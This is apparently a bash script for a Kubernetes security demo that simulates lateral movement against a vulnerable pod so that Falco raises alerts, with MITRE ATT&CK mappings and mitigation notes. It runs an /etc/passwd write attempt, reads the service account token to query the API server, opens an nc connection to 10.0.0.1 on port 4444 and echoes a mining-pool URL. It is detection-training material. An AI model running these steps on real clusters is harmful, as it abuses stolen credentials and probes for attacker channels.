#!/usr/bin/env bash
# ============================================================================
# ABOUTME: Attack simulation Phase 3 - Lateral movement and privilege escalation.
# ABOUTME: Demonstrates MITRE ATT&CK techniques T1021 and T1570 with Falco detection.
# ============================================================================
#
# ┌─────────────────────────────────────────────────────────────────────────┐
# │                    EDUCATIONAL SECURITY DEMONSTRATION                    │
# │                                                                          │
# │  This script simulates attacker behavior for EDUCATIONAL PURPOSES.      │
# │  It demonstrates techniques that security teams need to understand       │
# │  and detect. All actions are contained within a demo environment.       │
# └─────────────────────────────────────────────────────────────────────────┘
#
# PURPOSE:
#   Simulate the LATERAL MOVEMENT phase where the attacker attempts to:
#   1. Escalate privileges within the container
#   2. Install attack tools
#   3. Discover other services to pivot to
#   4. Establish persistent access or exfiltrate data
#   5. (Simulated) Deploy crypto miners or ransomware
#
# ATTACK SCENARIO:
#   Having stolen credentials in Phase 2, the attacker now attempts to:
#   - Escape the container or escalate privileges
#   - Move to other services in the cluster
#   - Establish command and control (C2) channels
#   - Potentially deploy malware (simulated for detection)
#
# ============================================================================
# MITRE ATT&CK MAPPING
# ============================================================================
#
# T1021 - Remote Services
#   Tactic: Lateral Movement
#   Description: Adversaries may use valid accounts to log into services
#                for lateral movement.
#   In Kubernetes: Using stolen tokens to access other pods/services
#   Sub-techniques:
#     T1021.004 - SSH
#     T1021.006 - Windows Remote Management
#
# T1570 - Lateral Tool Transfer
#   Tactic: Lateral Movement
#   Description: Adversaries may transfer tools between systems.
#   In Kubernetes: Downloading attack tools, transferring exploits
#   Detection: wget/curl to suspicious URLs, package manager usage
#
# T1068 - Exploitation for Privilege Escalation
#   Tactic: Privilege Escalation
#   Description: Exploiting vulnerabilities to gain higher privileges.
#   In Kubernetes: Container escape, kernel exploits, CAP abuse
#
# T1046 - Network Service Discovery
#   Tactic: Discovery
#   Description: Scanning for services on remote hosts.
#   In Kubernetes: Service enumeration via API, port scanning
#
# T1496 - Resource Hijacking
#   Tactic: Impact
#   Description: Leveraging resources for crypto mining.
#   In Kubernetes: Deploying miners in compromised containers
#
# ============================================================================
# FALCO RULES TRIGGERED
# ============================================================================
#
# The following Falco rules should detect this attack:
#
# 1. "Write below etc"
#    - Priority: ERROR
#    - Triggers: Writing to /etc/passwd, /etc/shadow
#    - Why: System file modification indicates privilege escalation
#
# 2. "Package Management Process Launched"
#    - Priority: NOTICE
#    - Triggers: apt-get, yum, pip, etc. in containers
#    - Why: Containers shouldn't install packages at runtime
#
# 3. "Contact K8s API Server From Container"
#    - Priority: NOTICE
#    - Triggers: Direct API calls to list services
#    - Why: Application-level service discovery is suspicious
#
# 4. "Outbound Connection to Suspicious Port"
#    - Priority: WARNING
#    - Triggers: Connection to ports like 4444 (reverse shell)
#    - Why: Common C2 ports indicate compromise
#
# 5. "Detect Crypto Mining Commands"
#    - Priority: CRITICAL
#    - Triggers: stratum+tcp, xmr, mining pool connections
#    - Why: Crypto mining is a common attack objective
#
# 6. "Container Drift Detected"
#    - Priority: WARNING
#    - Triggers: New executable not in original image
#    - Why: Indicates post-compromise modification
#
# ============================================================================
# DETECTION INDICATORS
# ============================================================================
#
# Security teams should look for:
#   - Write attempts to /etc/passwd, /etc/shadow
#   - Package manager processes in containers
#   - Outbound connections to unusual ports (4444, 6666, 9001)
#   - Connections to known mining pools
#   - stratum+tcp or mining-related strings in process args
#   - New executables appearing in containers
#   - nmap, netcat, masscan in containers
#
# ============================================================================
# REAL-WORLD ATTACK PROGRESSION
# ============================================================================
#
# In a real attack, this phase could lead to:
#   1. Container escape (if kernel vulnerable)
#   2. Node compromise (via hostPath, hostPID, hostNetwork)
#   3. Cluster takeover (via compromised node)
#   4. Data exfiltration (via DNS, HTTPS, or custom protocols)
#   5. Ransomware deployment (encrypt etcd, storage)
#   6. Crypto mining (monetize access)
#
# ============================================================================
# SAFETY NOTES
# ============================================================================
#
# This script:
#   - Only ATTEMPTS actions (many will fail due to restrictions)
#   - Does not actually install malware
#   - Does not connect to real C2 servers
#   - Only simulates crypto mining detection
#   - Should only be run in isolated demo environments
#
# ============================================================================

set -euo pipefail

# Configuration
NAMESPACE="vulnerable-app"
APP_LABEL="app=vulnerable-app"

# Terminal colors
BOLD='\033[1m'
RED='\033[0;31m'
YELLOW='\033[1;33m'
GREEN='\033[0;32m'
NC='\033[0m'

# ============================================================================
# SCRIPT HEADER
# ============================================================================
echo -e "${BOLD}========================================${NC}"
echo -e "${BOLD}  Phase 3: Lateral Movement${NC}"
echo -e "${BOLD}  MITRE ATT&CK: T1021, T1570${NC}"
echo -e "${BOLD}========================================${NC}"
echo ""

# ============================================================================
# TARGET POD IDENTIFICATION
# ============================================================================
POD=$(kubectl get pod -n "${NAMESPACE}" -l "${APP_LABEL}" -o jsonpath='{.items[0].metadata.name}' 2>/dev/null)
if [[ -z "${POD}" ]]; then
    echo -e "${RED}ERROR: No vulnerable-app pod found in namespace ${NAMESPACE}${NC}"
    exit 1
fi

echo -e "${GREEN}Target pod: ${POD}${NC}"
echo ""

# ============================================================================
# STEP 1: PRIVILEGE ESCALATION ATTEMPT
# ============================================================================
# TECHNIQUE: T1068 - Exploitation for Privilege Escalation
#
# ATTACK DETAILS:
#   Attempting to modify /etc/passwd is a classic privilege escalation
#   technique. In older systems, adding a user with UID 0 grants root.
#   Even in containers, this could allow:
#   - Running processes as different users
#   - Bypassing user-based access controls
#   - Preparing for container escape
#
# WHY THIS USUALLY FAILS:
#   Modern containers should have:
#   - Read-only root filesystem (immutable)
#   - Non-root user (no write permission)
#   - Security context restrictions
#
# FALCO DETECTION:
#   Rule: "Write below etc"
#   Priority: ERROR
#   Why: System configuration changes are high severity
#
# MITIGATION:
#   - Use read-only root filesystem (readOnlyRootFilesystem: true)
#   - Run as non-root (runAsNonRoot: true)
#   - Drop all capabilities (drop: ["ALL"])
#   - Use security contexts
# ============================================================================
echo -e "${YELLOW}[1/5] Attempting privilege escalation... (triggers Falco)${NC}"
echo -e "  Command: Attempting to write to /etc/passwd"
echo ""
kubectl exec -n "${NAMESPACE}" "${POD}" -- sh -c '
  echo "# Attempting to modify /etc/passwd" >> /etc/passwd 2>/dev/null && \
    echo "  WARNING: /etc/passwd was writable!" || \
    echo "  /etc/passwd write attempt blocked (still triggers Falco)"
'
echo ""
sleep 2

# ============================================================================
# STEP 2: TOOL INSTALLATION ATTEMPT
# ============================================================================
# TECHNIQUE: T1570 - Lateral Tool Transfer
#
# ATTACK DETAILS:
#   Attackers often need to install additional tools for:
#   - Network scanning (nmap, masscan)
#   - Network pivoting (netcat, socat)
#   - Data exfiltration (curl, wget)
#   - Exploitation (metasploit tools)
#
# COMMON ATTACK TOOLS:
#   - nmap: Network discovery and port scanning
#   - netcat (nc): Network Swiss army knife, reverse shells
#   - curl/wget: Download tools, exfiltrate data
#   - python: Run exploit scripts
#   - tcpdump: Network traffic capture
#
# FALCO DETECTION:
#   Rule: "Package Management Process Launched"
#   Priority: NOTICE
#   Why: Runtime package installation is suspicious
#
# MITIGATION:
#   - Use minimal base images (distroless, scratch)
#   - Remove package managers from production images
#   - Use read-only filesystem
#   - Network policies to block external downloads
# ============================================================================
echo -e "${YELLOW}[2/5] Attempting to install network tools...${NC}"
echo -e "  Command: apt-get install -y nmap netcat (simulated)"
echo ""
kubectl exec -n "${NAMESPACE}" "${POD}" -- sh -c '
  which nmap 2>/dev/null && echo "  nmap found!" || echo "  nmap not found (would install in real attack)"
  which nc 2>/dev/null && echo "  netcat found!" || echo "  netcat not found"
  which curl 2>/dev/null && echo "  curl found - can be used for data exfiltration"
'
echo ""
sleep 2

# ============================================================================
# STEP 3: SERVICE DISCOVERY FOR LATERAL MOVEMENT
# ============================================================================
# TECHNIQUE: T1046 - Network Service Discovery + T1021 - Remote Services
#
# ATTACK DETAILS:
#   Using the stolen token, the attacker queries the Kubernetes API
#   to discover other services. This reveals:
#   - Database services (postgresql, mysql, redis)
#   - Message queues (kafka, rabbitmq)
#   - Internal APIs and microservices
#   - Storage services
#
# WHY THIS IS DANGEROUS:
#   Service discovery is the first step to lateral movement. Once
#   the attacker knows what services exist, they can:
#   - Target services with stolen credentials
#   - Exploit known vulnerabilities
#   - Pivot through the internal network
#
# FALCO DETECTION:
#   Rule: "Contact K8s API Server From Container"
#   Priority: NOTICE
#   Why: Direct API queries for services are suspicious
#
# MITIGATION:
#   - RBAC: Don't grant service list permissions
#   - Network policies: Limit pod-to-pod communication
#   - Service mesh: mTLS between services
# ============================================================================
echo -e "${YELLOW}[3/5] Scanning for other services in the cluster...${NC}"
echo -e "  Command: Querying Kubernetes API for services"
echo ""
kubectl exec -n "${NAMESPACE}" "${POD}" -- sh -c '
  APISERVER="https://${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT}"
  TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
  echo "  Services discovered:"
  curl -sk --max-time 5 \
    -H "Authorization: Bearer ${TOKEN}" \
    "${APISERVER}/api/v1/services?limit=5" 2>/dev/null | \
    grep -o "\"name\":\"[^\"]*\"" | head -10 || echo "  (API query failed)"
'
echo ""
sleep 2

# ============================================================================
# STEP 4: COMMAND AND CONTROL (C2) CONNECTION ATTEMPT
# ============================================================================
# TECHNIQUE: T1571 - Non-Standard Port + C2 Communication
#
# ATTACK DETAILS:
#   Port 4444 is the default port for:
#   - Metasploit reverse shells
#   - Many other hacking tools' C2 channels
#
#   Attackers establish C2 channels to:
#   - Receive commands from their infrastructure
#   - Exfiltrate data
#   - Download additional payloads
#   - Maintain persistent access
#
# COMMON C2 PORTS:
#   - 4444: Metasploit default
#   - 5555: Android debug bridge (ADB)
#   - 6666, 6667: IRC-based botnets
#   - 8080: HTTP proxies, alternative web
#   - 9001: Tor default
#
# FALCO DETECTION:
#   Rule: "Outbound Connection to Suspicious Port"
#   Priority: WARNING
#   Triggers: nc, curl, or connect() to suspicious ports
#
# MITIGATION:
#   - Network policies: Restrict egress
#   - Egress gateways: Control outbound traffic
#   - DNS filtering: Block C2 domains
#   - Monitor for unusual outbound connections
# ============================================================================
echo -e "${YELLOW}[4/5] Connecting to non-standard port... (triggers Falco)${NC}"
echo -e "  Command: curl to external on port 4444 (common reverse shell port)"
echo ""
kubectl exec -n "${NAMESPACE}" "${POD}" -- sh -c '
  timeout 3 sh -c "echo test | nc -w 1 10.0.0.1 4444" 2>/dev/null || \
    echo "  Connection to 10.0.0.1:4444 failed (but triggered Falco alert)"
'
echo ""
sleep 2

# ============================================================================
# STEP 5: CRYPTO MINING DETECTION SIMULATION
# ============================================================================
# TECHNIQUE: T1496 - Resource Hijacking
#
# ATTACK DETAILS:
#   Crypto mining is one of the most common outcomes of Kubernetes
#   compromises because:
#   - Immediate monetization of access
#   - Low risk of detection (just CPU usage)
#   - Easy to automate
#   - Kubernetes provides lots of compute
#
# CRYPTO MINING INDICATORS:
#   - stratum+tcp:// connections (mining pool protocol)
#   - Connections to known mining pools
#   - High CPU usage without explanation
#   - Processes with mining-related names (xmrig, minerd)
#   - Wallet addresses in process arguments
#
# COMMON MINING MALWARE:
#   - XMRig: Monero CPU miner
#   - minergate: Multi-coin miner
#   - cryptonight: Mining algorithm
#
# FALCO DETECTION:
#   Rule: "Detect Crypto Mining Commands"
#   Priority: CRITICAL
#   Triggers: stratum+tcp, pool connections, miner binaries
#
# WHY THIS IS CRITICAL SEVERITY:
#   - Indicates complete container compromise
#   - Consumes resources, increases costs
#   - Often accompanied by other malware
#   - May indicate broader cluster compromise
#
# MITIGATION:
#   - Resource limits (prevent excessive CPU)
#   - Network policies (block mining pools)
#   - Runtime detection (Falco)
#   - Regular image scanning
# ============================================================================
echo -e "${YELLOW}[5/5] Simulating crypto mining detection... (triggers Falco)${NC}"
echo -e "  Command: Process with stratum+tcp in arguments"
echo ""
kubectl exec -n "${NAMESPACE}" "${POD}" -- sh -c '
  echo "Simulating mining command: --url stratum+tcp://pool.example.com:3333"
  # The echo alone may trigger Falco pattern matching on the command line
'
echo ""

# ============================================================================
# LATERAL MOVEMENT SUMMARY
# ============================================================================
echo -e "${BOLD}========================================${NC}"
echo -e "${BOLD}  Lateral Movement Simulation Complete${NC}"
echo -e "${RED}  Check Falco logs for CRITICAL alerts!${NC}"
echo -e "${BOLD}========================================${NC}"
echo ""
echo -e "View Falco alerts: kubectl logs -n falco -l app.kubernetes.io/name=falco -f --since=3m"
echo ""

# ============================================================================
# NEXT STEPS: PREVENTION
# ============================================================================
# Now that we've demonstrated the attack and shown detection, the next
# step is to show PREVENTION using Kyverno policies. This completes
# the Attack -> Detect -> Prevent narrative.
# ============================================================================
echo -e "${BOLD}Next step:${NC} Apply Kyverno policies to prevent redeployment:"
echo "  kubectl apply -k ../../tools/kyverno/policies/"
echo "  kubectl delete -f ../../workloads/vulnerable-app/deployment.yaml"
echo "  kubectl apply -f ../../workloads/vulnerable-app/deployment.yaml  # Should be REJECTED"
